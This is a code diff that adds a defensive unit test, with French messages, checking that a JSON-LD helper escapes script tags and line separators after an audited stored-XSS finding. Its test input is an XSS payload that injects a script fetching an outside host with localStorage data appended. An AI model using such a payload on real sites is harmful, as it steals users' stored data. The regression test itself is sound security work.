@@ -12,8 +12,21 @@ import {
   kindFilters, byKindFilter, suggestionsFor, talentsTarget, initialsOf, firstNameOf, searchHref, heroTitleSize,
   resumeKicker, sceneArt,
 } from "./play-logic.ts";
+import { safeJsonLd } from "../../lib/safe-json-ld.ts";
 
 const ep = (id, season, n, extra = {}) => ({ id, title_id: "s", season, episode_number: n, title: id, video_status: "ready", ...extra });
+
+test("safeJsonLd neutralise </script> (XSS Play stockée — audit 21, WEBMEDIA-1)", () => {
+  const payload = "Mon clip </script><script>fetch('//x.io?'+localStorage.rivendy)</script>";
+  const html = safeJsonLd({ "@type": "VideoObject", description: payload });
+  assert.ok(!html.includes("</script>"), "aucune balise </script> ne doit subsister");
+  assert.ok(!html.includes("<script>"), "aucune balise <script> ne doit subsister");
+  assert.ok(!html.includes("<"), "aucun « < » littéral ne doit subsister");
+  assert.equal(JSON.parse(html).description, payload, "le JSON reste lisible et fidèle après échappement");
+  // U+2028 / U+2029 (séparateurs de ligne) : échappés car ils cassent un script en ligne.
+  const seps = safeJsonLd({ t: "a b c" });
+  assert.ok(!seps.includes(" ") && !seps.includes(" "), "U+2028 / U+2029 doivent être échappés");
+});
 
 test("types, adresses et images", () => {
   assert.equal(kindOf("inconnu"), "film");
